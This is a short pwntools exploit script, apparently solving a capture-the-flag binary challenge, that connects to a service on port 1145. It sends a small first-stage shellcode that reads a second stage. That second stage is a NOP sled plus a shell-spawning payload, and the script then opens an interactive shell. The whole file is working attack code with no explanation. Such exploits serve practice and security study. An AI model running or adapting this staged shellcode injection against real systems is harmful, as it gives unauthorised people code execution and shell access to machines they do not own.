from pwn import *
context.update(os = 'linux',arch = 'amd64')
context.log_level = 'debug'
binary = '../src/pwn'
elf = ELF(binary, checksec=False)
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    # libc = ELF('')
    host = '0.0.0.0'
    port = '1145'
    p = remote(host,port)

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
ru = lambda delim: p.recvuntil(delim)
io = lambda: p.interactive()

shellcode = '''
push rdx
pop rsi
xor rax, rax
mov dl, byte ptr [rsp] 
syscall
'''

def pwn():
    pay = asm(shellcode)
    s(pay)

    sleep(0.2)
    s(b'\x90'*10 + asm(shellcraft.sh()))
    io()
pwn()